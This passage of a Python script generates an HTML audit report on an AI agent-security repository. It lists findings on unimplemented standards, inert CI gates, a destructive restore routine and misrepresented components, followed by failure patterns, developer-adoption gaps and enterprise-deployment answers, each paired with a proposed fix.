                 "**CloudEvents + Kafka async** — **no Kafka client, no CloudEvents library, no producer, no consumer, "
                 "no topic config**; three prose mentions only. **gRPC + protobuf internal** — types generate, but "
                 "**zero services are implemented or served**, and `signing.proto:9` concedes *“Most callers embed "
                 "trust-core as a library and do NOT use this service.”* **REST + JSON external** — the standard "
                 "requires an OpenAPI 3.1 spec per service; there are **zero OpenAPI files**. **SLSA Level 3+** — the "
                 "workflow uses `attest-build-provenance`, which yields Build **L2** on GitHub-hosted runners, and "
                 "silently skips missing binaries so the attestation can cover nothing.",
        blast="Three of seven have no code whatsoever; two more are materially over-claimed. Combined with AX-38, none "
              "of them has ever even been exercised.",
        fix="Delete the claims that have no code, and implement the two worth having: OTel tracing on the hot path "
            "(it is also how you would get the p99s AX-42 needs) and an OpenAPI spec per HTTP surface. Correct SLSA "
            "L3+ to L2. Renumber the standards honestly or write the missing twelve.",
        accept="Every standard the README claims is either implemented and tested, or removed from the README.",
    ),
    dict(
        fid="AX-44", sev="Medium", title="Coverage is 84.93% — under the advertised gate, which is inert anyway",
        area="CI / assurance", blocks="claim", gate="G3 Correctness", effort="M", evidence="EXECUTED",
        where="`.github/workflows/coverage.yml:33-42`",
        what="`cargo llvm-cov --workspace --summary-only` measured: **regions 84.71%, functions 81.97%, lines "
             "84.93%** — under 85% on every metric, against a repeatedly advertised *“≥85% coverage gate”*.",
        scenario="The gate does not exist. The step is `cargo llvm-cov --workspace --summary || true`, with a comment "
                 "stating *“The ≥85% gate is informational in Wave-1.5 … Wave-2 will replace the `|| true` with a hard "
                 "`--failunder-lines 85`.”* The one real `--cov-fail-under=85` in the repository lives inside a "
                 "reusable workflow published **for downstream consumers** and is invoked by nothing here. Python "
                 "coverage covers **1 of 35 packages** (hardcoded `--cov=cuda_gram`); **Go and TypeScript have no "
                 "coverage job at all**.",
        blast="Measured totals across the four languages are **1,173 tests passing** (242 Rust, 588 Python, 184 Go, "
              "159 TypeScript). The tests are real and the ratio of negative/adversarial tests is respectable "
              "(19&ndash;34%). But **10 crates declare `proptest` and exactly one property test exists**; there is "
              "**zero mutation testing**; and fuzzing runs **1 of 5 committed targets for 60 seconds, nightly, with "
              "`continue-on-error: true` and no seed corpus** — so every run restarts coverage from zero and a crash "
              "cannot fail the build.",
        fix="Make the gate real at whatever number is currently true, then ratchet. Add Go and TypeScript coverage and "
            "un-hardcode the Python package. Run all five fuzz targets with a committed corpus for materially longer, "
            "and remove `continue-on-error`. Write the nine missing property tests, starting with canonicalization.",
        accept="A blocking coverage gate at a measured threshold across all four languages; fuzzing that can fail CI.",
    ),
    dict(
        fid="AX-45", sev="Medium", title="The one working DR tool destroys the destination before restoring",
        area="Operations", blocks="deploy", gate="G12 Reliability", effort="S", evidence="READ",
        where="`python/warrantor_backup/src/aumos_backup/__init__.py:314-322`",
        what="`restore()` calls `shutil.rmtree(dest)` / `dest.unlink()` **before** copying the backup in. A failure "
             "part-way through the copy destroys the original and produces no restored copy; the handler returns "
             "`success=False` and recovers nothing.",
        scenario="This is the recovery path of the only genuinely functional disaster-recovery tool in the "
                 "repository — so the defect sits exactly where it does most damage. Digest verification is also only "
                 "**32 bits**, comparing against the 8-hex-character short digest embedded in the filename, which an "
                 "attacker with write access already controls.",
        blast="Worth stating plainly that `aumos_backup` is otherwise good work — write-to-`.partial`-then-atomic-"
              "rename is correct, restore recomputes and refuses on digest mismatch, pruning works, and it has 17 "
              "tests including a real round-trip and a tamper case. It is narrower than the DR document implies "
              "(local directory, not S3/Glacier/multi-region; no encryption at rest; no scheduler).",
        fix="Restore into a temporary directory, verify, then atomically swap — never delete before the replacement "
            "is verified on disk. Compare the full 256-bit digest, not the filename fragment.",
        accept="A test that fails the copy mid-restore and asserts the original is intact.",
    ),
]

EXTRA_FINDINGS += [
    dict(
        fid="AX-46", sev="High", title="eval-guard is the one component whose own code misrepresents it",
        area="Runtime", blocks="trust", gate="G5 Fail-closed controls", effort="M", evidence="READ",
        where="`rust/eval-guard/src/lib.rs:3,9,163`, `rust/eval-guard/Cargo.toml:7`",
        what="**Adversarial review sharpened this into its own finding, and it is the important one of the three "
             "mock-related cases.** `kill-switch` and `nvtrust-bridge` are honestly labelled *in code* — "
             "`kill-switch/src/lib.rs:174` says *“Wave-1 mock execution … without actually doing them”* and even "
             "carries a hardening commit whose whole purpose is to stop the stub claiming a government "
             "acknowledgement it never received; `nvtrust-bridge`'s docstring says the real SDK is NDA-gated and its "
             "catalog badge reads `NDA-gated real`, which is accurate. **`eval-guard` is different: it advertises "
             "capabilities it does not have and carries no mock marker anywhere.**",
        scenario="The module docstring promises *“Four pre-flight checks before an agent starts: NetworkIsolation, "
                 "FilesystemBoundary, ProcessIsolation, EgressAttestation”* and *“Requires Linux 5.13+ for eBPF; CI "
                 "runs the non-eBPF checks”*. The `Cargo.toml` description reads *“Cryptographic sandbox boundary "
                 "attestation (eBPF egress filter)”*. A grep for `bpf` in the crate returns **three hits, all prose**. "
                 "There is no eBPF code, and there are no “non-eBPF checks” for CI to run. "
                 "`run_preflight(results: &CheckResults, signing_key)` takes the four booleans **as an argument** and "
                 "signs whatever it is handed — the crate measures nothing.",
        blast="It has **zero callers in the entire workspace**, so nothing upstream measures anything either. And the "
              "catalog grades it *“emit a signed SandboxAttestation or refuse to start the agent (I-09)”* with a "
              "`fail-closed` badge — a claim that is simply false. Unlike the other two, there is no Wave-1 marker, no "
              "`task 03` note and no roadmap pointer to soften it.",
        fix="Either implement the four checks against real kernel facilities, or strip the eBPF language from the "
            "docstring and `Cargo.toml`, rename the type to make clear the caller asserts the results, and remove the "
            "`fail-closed` badge. Do not sign a `CheckResults` the crate did not compute.",
        accept="The crate either measures the four boundaries, or its documentation and catalog entry describe it as "
               "a caller-asserted attestation wrapper.",
    ),
    dict(
        fid="AX-47", sev="High", title="The declared RFC 8785 canonicalization is plain serde_json, deterministic by accident",
        area="Normative layer", blocks="integrate", gate="G4 Protocol conformance", effort="M", evidence="READ",
        where="`rust/protocol-contracts/src/validation.rs:468`",
        what="`registry.json:10` declares `\"json_canonicalization\": \"RFC8785\"`. The implementation is "
             "`serde_json::to_vec` on a cloned `Value` with the signature blanked. **It is not JCS.** There is no "
             "ECMAScript number normalization and no `\\u` escape normalization; it is deterministic only because "
             "`serde_json`'s default `Map` happens to be a `BTreeMap`.",
        scenario="Any genuine RFC 8785 implementation will produce different bytes for the same document &mdash; and "
                 "the repository already contains one: `gguf-ext` uses real `serde_jcs`. So two components in the same "
                 "workspace canonicalize JSON differently, and only one of them matches the declared profile. Python "
                 "compounds it: `json.dumps(sort_keys=True)` sorts by Unicode **code point** where RFC 8785 §3.2.3 "
                 "mandates **UTF-16 code unit** ordering &mdash; demonstrated divergence on non-BMP keys, which "
                 "`extensions` permits.",
        blast="Adversarial review flagged this as *arguably more real than AX-01*, and that judgement is sound: unlike "
              "the CBOR forgery, this one is **on the live P1&ndash;P12 signing path in two languages today**. It is "
              "the concrete mechanism behind the cross-language interop risk that AX-08 describes in the abstract.",
        fix="Use a real JCS implementation on the protocol path &mdash; `serde_jcs` is already a dependency of this "
            "workspace &mdash; and mirror it exactly in Python, Go and TypeScript. Then add an RFC 8785 vector with a "
            "non-BMP key and a float to the conformance corpus, which currently has none.",
        accept="All four languages produce byte-identical canonical output for a corpus including non-BMP keys, "
               "escapes and numeric edge cases.",
    ),
]

FINDINGS.extend(EXTRA_FINDINGS)
_ORDER = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3}
FINDINGS.sort(key=lambda f: (_ORDER[f["sev"]], f["fid"]))


def sec_gaps():
    sevs = [("critical", "Critical"), ("high", "High"), ("medium", "Medium"), ("low", "Low")]
    blocks = [("integrate", "Cannot integrate"), ("deploy", "Cannot deploy"), ("trust", "Cannot trust"),
              ("scale", "Cannot scale"), ("claim", "Cannot claim")]
    efforts = [("s", "S"), ("m", "M"), ("l", "L"), ("xl", "XL")]
    bar = filter_bar("gaps", [("sev", sevs), ("blocks", blocks), ("effort", efforts)], "Search findings…")
    dossiers = "".join(render_finding(f) for f in FINDINGS)
    counts = {s: sum(1 for f in FINDINGS if f["sev"] == s) for _, s in sevs}
    st = "".join(S._stat(v, k) for k, v in counts.items())
    return f"""
<section id="gaps">
<div class="eyebrow">08 &middot; Gap register</div>
<h2>Every gap, limitation, challenge and pending item &mdash; with the fix</h2>
{para("Each finding is graded four ways at once, because a single axis hides the thing you actually need to decide. "
      "**Severity &times; blast radius** says how bad it is. **Release-gate mapping** ties it to the project's own "
      "G1&ndash;G14 so it is actionable against existing tracker state. **Adoption-blocker tiering** says who stops "
      "when they hit it. **Effort** says what it costs to close. Filter by any combination.")}
<div class="stats">{st}</div>
{para("For orientation: *cannot integrate* means a developer stops here; *cannot deploy* means an enterprise stops "
      "here; *cannot trust* means the security claim itself fails; *cannot scale* means operations fail; *cannot "
      "claim* means the assertion would not survive external scrutiny.")}
<div data-filter-scope="gaps">{bar}{dossiers}</div>
<div class="warn"><div class="calltitle">On the 371 open task checkboxes &mdash; measured, not assumed</div>
{para("The tracker's headline is **371 task checkboxes, 0 checked**. I extracted and de-duplicated all of them across "
      "the 56 task files. **They contain only 42 distinct texts — an 8.8&times; repetition factor.** Seven template "
      "lines repeated 48 times each account for **336 of the 371**:")}
<div class="tw"><table data-sortable>
<thead><tr><th>Count</th><th>Checkbox text</th><th>Actually true today?</th></tr></thead><tbody>
<tr><td data-sort="48">48&times;</td><td><code>Feature implemented per the RFC.</code></td><td>Varies &mdash; 46 of 54 RFCs are a 98-line template, so for most components this is unfalsifiable.</td></tr>
<tr><td data-sort="48">48&times;</td><td><code>cargo test / pytest / npm test green (per language).</code></td><td><strong>Already true</strong> for Rust (242/242), TypeScript (159/159) and Go (11/11 modules). Python is 585/590.</td></tr>
<tr><td data-sort="48">48&times;</td><td><code>Lint clean (clippy -D warnings / ruff / eslint).</code></td><td><strong>Mixed</strong> &mdash; clippy is clean; eslint fails with 37 errors; 21 of 35 Python projects fail lint.</td></tr>
<tr><td data-sort="48">48&times;</td><td><code>Coverage &ge;85% on new code.</code></td><td><strong>Unmeasurable</strong> &mdash; the coverage step is <code>|| true</code> and no number is ever produced.</td></tr>
<tr><td data-sort="48">48&times;</td><td><code>Golden vector present.</code></td><td><strong>Technically true, operationally meaningless</strong> &mdash; 40 vectors exist and are valid, and the conformance suite executes none of them.</td></tr>
<tr><td data-sort="48">48&times;</td><td><code>CHANGELOG updated.</code></td><td>Unverified.</td></tr>
<tr><td data-sort="48">48&times;</td><td><code>Commit signed (-s).</code></td><td>DCO sign-off, not a cryptographic signature.</td></tr>
<tr><td data-sort="35">35</td><td><em>genuinely one-off items</em></td><td>The real remainder &mdash; mostly per-component build and smoke checks.</td></tr>
</tbody></table></div>
{para("**So the 371 figure is a template artifact, not a backlog — and it misleads in both directions.** It overstates "
      "remaining work, because several of those boxes describe conditions that already hold and simply never got "
      "ticked. And it would mislead just as badly if someone ticked them, because *“Coverage &ge;85%”* is unmeasured "
      "and *“Golden vector present”* is satisfied by vectors nobody runs. **Ticking these boxes is not progress; "
      f"making them measurable is.** The {len(FINDINGS)} findings above are the real work: close them and the "
      "meaningful subset of these 42 distinct items closes with them.")}</div>
</section>"""


def sec_crosscut():
    pats = [
        ("The error path is the permissive path",
         "`unwrap_or(CborValue::Null)` produces a signable canonical form. `now_epoch().unwrap_or(0)` validates every "
         "expired credential. A non-monotonic clock silently disables the volume monitor. An empty `jti` makes a "
         "credential permanently unrevocable — and a test asserts it. An empty attestation baseline means *do not "
         "check*. An unreachable trust-core degrades signing to a forgeable HMAC. Individually these are bugs; "
         "together they are a house style.",
         "Ban `unwrap_or`, `unwrap_or_default`, `.ok()` and bare `except: pass` on any path that yields a security "
         "decision. Add a clippy lint and a review gate. Every default denies."),
        ("Integrity is implemented; authenticity is not",
         "Five Rust crates verify signatures against a key read out of the artifact being verified. Python verifies "
         "model provenance against an unkeyed hash of values inside the file. `key_id` is never bound to `issuer`, so "
         "any key in the keyring signs for any agent. `verify_strict` is used **zero** times repo-wide.",
         "Every verify API takes a trust anchor. Resolve `key_id` against the claimed issuer. Switch to "
         "`verify_strict`."),
        ("Signatures over unmeasured values",
         "`flight-recorder` fabricates the policy decision. `eval-guard` signs boundary checks that are function "
         "arguments, with a throwaway key, and the signature omits the field consumers read. `defstack-cli` signs a "
         "compliance report for six frameworks it never evaluated. `attesta_flow`'s “signed attestation” has no "
         "signature field.",
         "A signature is a claim about a measurement. If nothing was measured, emit nothing. This is the "
         "highest-liability pattern in the audit."),
        ("Green gates that measure the wrong thing",
         "The conformance runner is scoped to the wrong directory. Its one canonicalization vector instructs verifiers "
         "not to canonicalize. Negative coverage is a single mechanical field deletion per protocol. `check_docs.py` "
         "counts files and links. Coverage and SBOM steps end in `|| true`. There is no `cargo audit` or `cargo deny` "
         "anywhere in a security project.",
         "Make every gate blocking, and make each one test the property named in its title rather than a proxy for it."),
        ("Generated bindings that never compile",
         "`go/protocol-contracts` has no `go.mod`; `typescript/protocol-contracts` has no `package.json` and is absent "
         "from the workspace. Both are invisible to their toolchains and imported by nothing — and the TypeScript one "
         "is the sole source of the 37 lint errors that red the CI.",
         "Wire them into their build systems or delete them. Fail discovery loudly on a source directory with no "
         "manifest instead of skipping it."),
        ("The real implementation is orphaned; the fake one ships",
         "`go/identity-bindings` does genuine SPIFFE and has zero importers, while `go/agent-identity` — "
         "`fmt.Sprintf(\"spiffe://…\")`, empty `go.mod` — is what the Dockerfile and Helm chart deploy. "
         "`sandbox-runtime` is real Wasmtime isolation and the catalog says it does not exist, while `secure-workspace` "
         "sits unwired beside it.",
         "Ship what works. This pattern costs nothing to fix and is currently discarding the best code in the "
         "repository."),
        ("Documentation asserting a maturity the code lacks",
         "46 of 54 RFCs are one 98-line template. The catalog is wrong in both directions. The README status section "
         "reads as a maturity claim. Protocol prose promises six classes of adversarial vector where three files "
         "exist. Comments claim CBOR where the code does JSON, and claim payloads never go in argv where they do.",
         "Regrade honestly. An accurate `spec_only` is worth more than an inaccurate `reference_implementation`, "
         "because the first invites contribution and the second invites a hostile review."),
    ]
    rows = "".join(
        f'<div class="card"><h4>{i+1}. {esc(t)}</h4>{para(d)}'
        f'<p><strong>Systemic fix:</strong> {md(f)}</p></div>' for i, (t, d, f) in enumerate(pats))
    return f"""
<section id="crosscut">
<div class="eyebrow">09 &middot; Patterns</div>
<h2>Seven failure patterns that explain thirty-one findings</h2>
{para("Individual defects are cheap to fix and expensive to enumerate. The patterns beneath them are what actually "
      "need a decision, because each one will regenerate its defects as soon as new code is written under the same "
      "habits.")}
{rows}
</section>"""


def sec_devfit():
    return f"""
<section id="devfit">
<div class="eyebrow">10 &middot; Developer integration</div>
<h2>Can a developer actually adopt this today? No &mdash; and the reasons are specific</h2>
{para("The audit tested the integration story against the four runtimes that matter for native and agentic AI: the "
      "MCP ecosystem, agent SDKs, the serving and gateway layer, and Kubernetes with confidential compute. The verdict "
      "differs by surface, and one of them is genuinely close.")}
<h3>1. MCP ecosystem &mdash; the most advanced surface, with a self-inflicted wound</h3>
{bullets([
 "**Targets MCP `2026-07-28`, the current revision** — ahead of the official SDK, whose `LATEST_PROTOCOL_VERSION` is "
 "still `2025-11-25`. The stateless model, `server/discover`, the `io.modelcontextprotocol/*` `_meta` keys and "
 "`CacheableResult` are all correctly implemented. The tracker's own finding that MCP interop “trails current "
 "ecosystems” is **wrong about the version**. [EXECUTED]",
 "**But it rejects `2025-06-18` and `2025-03-26`** — the two most-deployed revisions — so real Claude Desktop, Cursor "
 "and Zed clients negotiating those versions get `-32602 unsupported legacy initialize protocol version`. The README "
 "claims compatibility with five clients; that claim is untested. [EXECUTED]",
 "**No tool annotations at all.** A grep for `readOnlyHint|destructiveHint|idempotentHint|openWorldHint|outputSchema` "
 "returns **0**. For a product whose entire thesis is the read/write/financial/destructive/physical ladder, declining "
 "to tag `aumos_kill` with `destructiveHint: true` — a native spec field for exactly this — is a self-inflicted wound.",
 "**No authorization.** The spec mandates OAuth 2.1 resource-server behaviour with RFC 9728 protected-resource "
 "metadata, RFC 8707 resource indicators and audience validation. The gateway sends no `Authorization` header and does "
 "no discovery. For a security gateway this is the largest single spec gap.",
 "**No MRTR** (`resultType: input_required`), so there is no in-protocol human approval — which is precisely what "
 "invariant I-08 needs.",
 "`ping` was removed in the 2026-07-28 revision and is still implemented and advertised.",
])}
<h3>2. Agent SDKs &mdash; nothing exists</h3>
{para("For Claude Agent SDK, OpenAI Agents SDK, LangGraph, CrewAI and AutoGen there is **no adapter, no middleware, no "
      "hook, no example and no documentation**. `README.md:62` states TypeScript owns *“SDK ergonomics”*; there is no "
      "`@aumos/sdk`, no client library and no `AumosClient`. `python/warrantor_langchain` is a real LangChain callback "
      "adapter — the one genuine integration in the repo — but it depends on downstream components that are stubs. "
      "The core integration question, *“I have an agent loop; how do I wrap it in Warrantor authority and receipts without "
      "forking my framework?”*, has no answer here.")}
<h3>3. Serving and gateway layer &mdash; reinvention against a 56k-star incumbent</h3>
{bullets([
 "`inference-proxy` is **not a proxy**: no tokio, hyper, axum or reqwest; `handle()` takes a closure as “upstream”. "
 "Two of its six claimed middlewares do not exist.",
 "It carries a **live cross-tenant cache leak** — the key is `sha256(model|prompt)` with no tenant identity (AX-22).",
 "Its `DenyAllAuth` default is nonetheless **the one genuinely fail-closed default in the Rust workspace**, and "
 "deserves to be the template for the others.",
 "LiteLLM ships per-key and per-team budgets at 56k stars with Stripe and Netflix in production. This is not a "
 "winnable fight, and the policy hooks Warrantor wants would be welcome contributions there. [EXTERNAL]",
])}
<h3>4. Platform, Kubernetes and confidential compute &mdash; not deployable</h3>
{bullets([
 "**The Helm chart does not render** (AX-25). `deploy/k8s/`, `deploy/airgap/`, `deploy/docker/` and `deploy/systemd/` "
 "are empty. [EXECUTED]",
 "No CRDs exist for either claimed operator; `fleet-marshal`'s shipped `main` is a dry-run logger that returns "
 "`Ready: true` for every pod; `tenant-guard` does GPU quota arithmetic in a map with no cgroup, device plugin, "
 "namespace or NetworkPolicy.",
 "The admission controller is never deployed, and even wired up it checks annotation *presence* — set "
 "`aumos.io/aae: x` and you are admitted.",
 "mTLS defaults **off**; when enabled it runs `ghcr.io/spiffe/spire-agent:latest` — an unpinned mutable tag in the "
 "security-critical path — as a one-shot initContainer with no socket volume mount.",
 "The practical deployment path is `docker-compose.yml` on a single host, with mock attestation and self-signed "
 "in-process identity.",
])}
<div class="danger"><div class="calltitle">The blunt developer verdict</div>
{para("Nothing is published to npm or PyPI. The README's own run command — `npx aumos-mcp --standalone` — is a **silent "
      "no-op on every platform**, because the main-module check compares an npm symlink path against a resolved "
      "realpath. The copy-paste Claude Code config in the README points at a 404, and ships "
      "`AUMOS_MODE: standalone`, which is the mode that returns hardcoded security *passes*. A developer following the "
      "documentation gets silence, then a registry error, then — if they persist — a control plane that always says "
      "yes.")}</div>
</section>"""


def sec_entfit():
    return f"""
<section id="entfit">
<div class="eyebrow">11 &middot; Enterprise deployment</div>
<h2>What happens if a regulated enterprise tries to deploy this</h2>
{para("Assessed against the questions an enterprise security architect actually asks, in the order they ask them.")}
<div class="tw"><table data-sortable>
<thead><tr><th>Question</th><th>Answer today</th><th>Gate</th></tr></thead><tbody>
<tr><td>Can we install it?</td><td><strong>No.</strong> The Helm chart fails to render; <code>deploy/k8s/</code> is empty; no images are published.</td><td>G6</td></tr>
<tr><td>Is it fail-closed?</td><td><strong>Partly.</strong> The MCP server's connected mode genuinely is. The gateway, egress filter, attestation layer and key-release policy are not.</td><td>G5</td></tr>
<tr><td>Can agents bypass it?</td><td><strong>Yes, trivially.</strong> It is a library, not a chokepoint. Not calling it is sufficient.</td><td>G9</td></tr>
<tr><td>Is tenant isolation enforced?</td><td><strong>No.</strong> Live cross-tenant cache leak in the inference path; quota arithmetic in a map with no kernel primitive.</td><td>G7</td></tr>
<tr><td>Is evidence durable?</td><td><strong>No.</strong> <code>flight-recorder</code> has zero persistence and fabricates the policy field it signs.</td><td>G8</td></tr>
<tr><td>Is the supply chain verifiable?</td><td><strong>No.</strong> No <code>cargo audit</code>/<code>cargo deny</code>; SBOM steps end in <code>|| true</code>; SBOM output is not a valid ML-BOM.</td><td>G11</td></tr>
<tr><td>Has the trusted core been audited?</td><td><strong>No</strong> &mdash; and this audit found a universal signature forgery in it.</td><td>G10</td></tr>
<tr><td>What is the operational burden?</td><td><strong>Unknown and large.</strong> 54 components, no runbooks, no SLOs, no support model.</td><td>G12</td></tr>
<tr><td>Can we produce regulator evidence?</td><td><strong>Not safely.</strong> The compliance report is fabricated and signed &mdash; worse than producing nothing.</td><td>G13</td></tr>
<tr><td>Will it exist in 18 months?</td><td><strong>Unanswerable.</strong> Three days of history, single-author, 54 components.</td><td>&mdash;</td></tr>
</tbody></table></div>
<div class="warn"><div class="calltitle">The objection with no answer</div>
{para("*“We are an AWS shop. AgentCore Policy is GA in thirteen regions, uses Cedar, intercepts every tool call, and "
      "is included in what we already pay for. Why would we add a third-party substrate?”* For a single-cloud buyer "
      "there is currently no answer, and that is most of the addressable market. The answer that does exist — "
      "**portability and sovereignty**: one substrate that behaves identically on AWS, Azure, GCP and on-premises, "
      "which matters enormously in India and the Gulf and matters again because AWS has no confidential GPU at all — "
      "is a positioning advantage rather than a technology one, and `go/sovereign-stack` is the least-invested "
      "component in the catalog relative to its strategic weight.")}</div>
<div class="good"><div class="calltitle">What an enterprise could credibly use today</div>
{bullets([
 "**`gguf-ext`** as a hardened GGUF parser — genuinely better than the alternatives, with fuzz targets and a live CVE "
 "class it addresses.",
 "**`sandbox-runtime`** as a WASM tool-execution boundary, once wired to something.",
 "**`dp-crate`** for differential privacy accounting.",
 "**`go/identity-bindings`** as a SPIFFE integration library, once it has an importer.",
 "**The protocol schemas themselves**, as a vocabulary for internal design — which is arguably their highest-value "
 "use right now.",
])}</div>
</section>"""
